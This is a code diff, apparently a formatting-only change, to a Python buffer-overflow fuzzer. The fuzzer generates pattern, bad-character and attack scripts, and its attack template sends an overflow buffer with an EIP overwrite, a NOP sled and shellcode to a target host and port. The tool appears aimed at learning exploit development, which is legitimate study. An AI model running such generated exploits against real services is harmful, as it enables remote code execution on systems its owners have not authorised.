@@ -28,6 +28,7 @@ DELAY = 1.0
 # HELPER FUNCTIONS
 # -------------------------------------------------------------------------------------------------
 
+
 def b2str(data):
     """Convert bytes into string type."""
     try:
@@ -54,6 +55,7 @@ def print_crashlog(prefix, suffix, char, buff):
 # GENERATE FUNCTIONS
 # -------------------------------------------------------------------------------------------------
 
+
 def _script_pattern(host, port, prefix, suffix, init, exit):
     """Generate pattern overflow triaging scripts."""
     code_head = '''#!/usr/bin/env python
@@ -69,31 +71,33 @@ pattern = ""     # Add output from pattern_create.rb
 try:
     print('Sending buffer...')
     s.connect(('{}', {}))
-'''.format(host, port)
+'''.format(
+        host, port
+    )
 
-    code_init = ''
+    code_init = ""
     if init is not None:
         for comm in init.split(","):
             d_send, d_expect = comm.split(":")
             if len(d_send) > 0:
-                code_init += '''    s.send('{}' + '\\r\\n')\n'''.format(d_send)
+                code_init += """    s.send('{}' + '\\r\\n')\n""".format(d_send)
             if len(d_expect) > 0:
-                code_init += '''    s.recv(1024)\n'''
+                code_init += """    s.recv(1024)\n"""
 
-    payload = '''    s.send('{}' + pattern + '{}' + '\\r\\n')\n'''.format(prefix, suffix)
+    payload = """    s.send('{}' + pattern + '{}' + '\\r\\n')\n""".format(prefix, suffix)
 
-    code_exit = ''
+    code_exit = ""
     if exit is not None:
         for comm in exit.split(","):
             d_send, d_expect = comm.split(":")
             if len(d_send) > 0:
-                code_exit += '''    s.send('{}' + '\\r\\n')\n'''.format(d_send)
+                code_exit += """    s.send('{}' + '\\r\\n')\n""".format(d_send)
             if len(d_expect) > 0:
-                code_exit += '''    s.recv(1024)\n'''
-    code_tail = '''    print('done')
+                code_exit += """    s.recv(1024)\n"""
+    code_tail = """    print('done')
 except:
     print('Could not connect')
-'''
+"""
     return code_head + code_init + payload + code_exit + code_tail
 
 
@@ -134,31 +138,33 @@ buffer = "{}"*len_overflow + eip + badchars
 try:
     print('Sending buffer...')
     s.connect(('{}', {}))
-'''.format(length, length-30, char, host, port)
+'''.format(
+        length, length - 30, char, host, port
+    )
 
-    code_init = ''
+    code_init = ""
     if init is not None:
         for comm in init.split(","):
             d_send, d_expect = comm.split(":")
             if len(d_send) > 0:
-                code_init += '''    s.send('{}' + '\\r\\n')\n'''.format(d_send)
+                code_init += """    s.send('{}' + '\\r\\n')\n""".format(d_send)
             if len(d_expect) > 0:
-                code_init += '''    s.recv(1024)\n'''
+                code_init += """    s.recv(1024)\n"""
 
-    payload = '''    s.send('{}' + buffer + '{}' + '\\r\\n')\n'''.format(prefix, suffix)
+    payload = """    s.send('{}' + buffer + '{}' + '\\r\\n')\n""".format(prefix, suffix)
 
-    code_exit = ''
+    code_exit = ""
     if exit is not None:
         for comm in exit.split(","):
             d_send, d_expect = comm.split(":")
             if len(d_send) > 0:
-                code_exit += '''    s.send('{}' + '\\r\\n')\n'''.format(d_send)
+                code_exit += """    s.send('{}' + '\\r\\n')\n""".format(d_send)
             if len(d_expect) > 0:
-                code_exit += '''    s.recv(1024)\n'''
-    code_tail = '''    print('done')
+                code_exit += """    s.recv(1024)\n"""
+    code_tail = """    print('done')
 except:
     print('Could not connect')
-'''
+"""
     return code_head + code_init + payload + code_exit + code_tail
 
 
@@ -184,31 +190,33 @@ buffer  = "{}"*len_overflow + eip + \"\\x90\"*len_nop_sled + shellcode + padding
 try:
     print('Sending buffer...')
     s.connect(('{}', {}))
-'''.format(length, length-30, char, host, port)
+'''.format(
+        length, length - 30, char, host, port
+    )
 
-    code_init = ''
+    code_init = ""
     if init is not None:
         for comm in init.split(","):
             d_send, d_expect = comm.split(":")
             if len(d_send) > 0:
-                code_init += '''    s.send('{}' + '\\r\\n')\n'''.format(d_send)
+                code_init += """    s.send('{}' + '\\r\\n')\n""".format(d_send)
             if len(d_expect) > 0:
-                code_init += '''    s.recv(1024)\n'''
+                code_init += """    s.recv(1024)\n"""
 
-    payload = '''    s.send('{}' + buffer + '{}' + '\\r\\n')\n'''.format(prefix, suffix)
+    payload = """    s.send('{}' + buffer + '{}' + '\\r\\n')\n""".format(prefix, suffix)
 
-    code_exit = ''
+    code_exit = ""
     if exit is not None:
         for comm in exit.split(","):
             d_send, d_expect = comm.split(":")
             if len(d_send) > 0:
-                code_exit += '''    s.send('{}' + '\\r\\n')\n'''.format(d_send)
+                code_exit += """    s.send('{}' + '\\r\\n')\n""".format(d_send)
             if len(d_expect) > 0:
-                code_exit += '''    s.recv(1024)\n'''
-    code_tail = '''    print('done')
+                code_exit += """    s.recv(1024)\n"""
+    code_tail = """    print('done')
 except:
     print('Could not connect')
-'''
+"""
     return code_head + code_init + payload + code_exit + code_tail
 
 
@@ -219,15 +227,15 @@ def generate(directory, host, port, char, prefix, suffix, length, init, exit):
     pattern = _script_pattern(host, port, prefix, suffix, init, exit)
     badchars = _script_badchars(host, port, char, prefix, suffix, length, init, exit)
 
-    fp = open(os.path.join(directory, 'attack.py'), 'w')
+    fp = open(os.path.join(directory, "attack.py"), "w")
     fp.write(attack)
     fp.close()
 
-    fp = open(os.path.join(directory, 'pattern.py'), 'w')
+    fp = open(os.path.join(directory, "pattern.py"), "w")
     fp.write(pattern)
     fp.close()
 
-    fp = open(os.path.join(directory, 'badchars.py'), 'w')
+    fp = open(os.path.join(directory, "badchars.py"), "w")
     fp.write(badchars)
     fp.close()
 
@@ -304,6 +312,7 @@ def receive(s, timeout, bufsize=1024):
 # -------------------------------------------------------------------------------------------------
 # ARGS
 # -------------------------------------------------------------------------------------------------
+
 
 def _args_check_dir(value):
     """Check argument for valid directory."""
@@ -404,7 +413,9 @@ example:\n
         help="""Initial length to concat buffer string with x*char.
 When using the '-g' option to generate reproducible attack scripts set this to the
 value at which the crash occured in order to pre-populate the generated scripts.
-""" + "Default: " + str(INIT_MULTIPLIER),
+"""
+        + "Default: "
+        + str(INIT_MULTIPLIER),
     )
     parser.add_argument(
         "-m",
@@ -454,7 +465,8 @@ Regex supported for <expect> part.""",
         default=TIMEOUT,
         type=float,
         help="""Timeout in seconds for receiving data before declaring
-the endpoint as crashed. Default: """ + str(TIMEOUT),
+the endpoint as crashed. Default: """
+        + str(TIMEOUT),
     )
     parser.add_argument(
         "-d",
